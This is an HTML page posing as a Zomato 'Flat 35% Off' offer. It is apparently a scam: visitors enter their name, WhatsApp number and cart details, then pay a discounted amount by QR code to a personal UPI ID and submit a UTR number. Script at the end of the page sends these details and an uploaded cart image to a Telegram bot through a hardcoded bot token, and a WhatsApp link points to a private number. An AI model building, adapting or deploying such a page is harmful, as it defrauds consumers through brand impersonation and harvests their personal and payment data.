<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zomato - Flat 35% Off</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --zomato-red: #E23744; }
        body { background-color: #f8f8f8; font-family: sans-serif; }
        .zomato-card { border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .bg-zomato { background-color: var(--zomato-red); }
        .text-zomato { color: var(--zomato-red); }
        .step-progress { height: 4px; background: var(--zomato-red); transition: 0.3s; width: 25%; }
        .hidden { display: none; }
    </style>
</head>
<body>

    <audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3"></audio>
    <audio id="successSound" src="https://www.myinstants.com/media/sounds/success-fanfare-trumpets.mp3"></audio>

    <nav class="bg-white p-4 sticky top-0 z-50 shadow-sm text-center">
        <img src="https://b.zmtcdn.com/web_assets/b40b97e677bc7b2ca77c58c61db266fe1603954218.png" class="w-20 mx-auto">
        <div class="w-full bg-gray-100 h-1 mt-3 rounded-full">
            <div id="progress" class="step-progress"></div>
        </div>
    </nav>

    <div class="max-w-md mx-auto p-4">
        <div id="step-0" class="section">
            <div class="bg-white p-6 zomato-card text-center mt-4">
                <h1 class="text-3xl font-black italic">FLAT 35% OFF</h1>
                <p class="text-gray-500 text-sm mt-2">Special Offer on Zomato Cart!</p>
                <button onclick="playSound('clickSound'); nextStep(1)" class="bg-zomato text-white w-full py-4 rounded-xl font-bold mt-6 shadow-lg">ORDER NOW</button>
            </div>
        </div>

        <div id="step-1" class="section hidden">
            <h2 class="font-bold mb-4 mt-4">Details</h2>
            <div class="bg-white p-6 zomato-card space-y-4">
                <input type="text" id="name" class="w-full p-4 border rounded-xl" placeholder="Full Name">
                <input type="tel" id="whatsapp" class="w-full p-4 border rounded-xl" placeholder="WhatsApp Number">
                <button onclick="playSound('clickSound'); nextStep(2)" class="bg-zomato text-white w-full py-4 rounded-xl font-bold">CONTINUE</button>
            </div>
        </div>

        <div id="step-2" class="section hidden">
            <h2 class="font-bold mb-4 mt-4">Cart Info</h2>
            <div class="bg-white p-6 zomato-card space-y-4">
                <input type="url" id="cart_link" class="w-full p-4 border rounded-xl" placeholder="Zomato Cart Link">
                <input type="file" id="cart_img" class="w-full p-3 border-dashed border-2 rounded-xl">
                <input type="number" id="cart_value" class="w-full p-4 border rounded-xl font-bold" placeholder="Cart Value (‚Çπ)">
                <button onclick="playSound('clickSound'); calculateAndPay()" class="bg-zomato text-white w-full py-4 rounded-xl font-bold">GET DISCOUNTED QR</button>
            </div>
        </div>

        <div id="step-3" class="section hidden text-center">
            <div class="bg-green-100 text-green-700 p-2 rounded mb-4 font-bold">Pay Only: ‚Çπ<span id="pay_amt">0</span></div>
            <img id="qr_code" class="w-48 h-48 mx-auto bg-white p-2 border shadow-sm rounded-lg mb-4">
            <div class="bg-white p-6 zomato-card text-left space-y-4">
                <input type="file" id="pay_img" class="w-full p-3 border-dashed border-2 rounded-xl">
                <input type="text" id="utr" class="w-full p-4 border rounded-xl" placeholder="UTR Number">
                <button id="final-btn" onclick="submitData()" class="bg-black text-white w-full py-4 rounded-xl font-bold">SUBMIT ORDER</button>
            </div>
        </div>

        <div id="step-4" class="section hidden text-center pt-10">
            <h2 class="text-2xl font-bold text-green-600">Order Placed!</h2>
            <p class="mb-6 text-gray-500">Your ID: <span id="oid"></span></p>
            <a href="https://wa.me/918770959252?text=hi" class="bg-green-500 text-white w-full block py-4 rounded-xl font-bold">CONFIRM ON WHATSAPP</a>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "7381284661:AAGL3R7TWg08GF461MJjJREoR5431SEqDR4";
        const CHAT_ID = "5756664465";

        function playSound(id) { document.getElementById(id).play(); }

        function nextStep(step) {
            document.querySelectorAll('.section').forEach(s => s.classList.add('hidden'));
            document.getElementById('step-' + step).classList.remove('hidden');
            document.getElementById('progress').style.width = (step * 25 + 25) + "%";
        }

        function calculateAndPay() {
            const val = document.getElementById('cart_value').value;
            const final = (val - (val * 0.35)).toFixed(2);
            document.getElementById('pay_amt').innerText = final;
            const upi = `upi://pay?pa=VIRATXOP@FAM&pn=Zomato&am=${final}&cu=INR`;
            document.getElementById('qr_code').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upi)}`;
            nextStep(3);
        }

        async function submitData() {
            playSound('clickSound');
            const btn = document.getElementById('final-btn');
            btn.innerText = "Sending..."; btn.disabled = true;

            const oid = Math.floor(100000 + Math.random() * 900000);
            const msg = `üçï *NEW ORDER %23${oid}*%0A%0A*Name:* ${document.getElementById('name').value}%0A*Phone:* ${document.getElementById('whatsapp').value}%0A*Price:* ‚Çπ${document.getElementById('pay_amt').innerText}%0A*UTR:* ${document.getElementById('utr').value}`;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}&parse_mode=Markdown`);
            
            // Image Upload
            const cartImg = document.getElementById('cart_img').files[0];
            if(cartImg) {
                const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', cartImg);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }

            playSound('successSound');
            document.getElementById('oid').innerText = "#" + oid;
            nextStep(4);
        }
    </script>
</body>
</html>
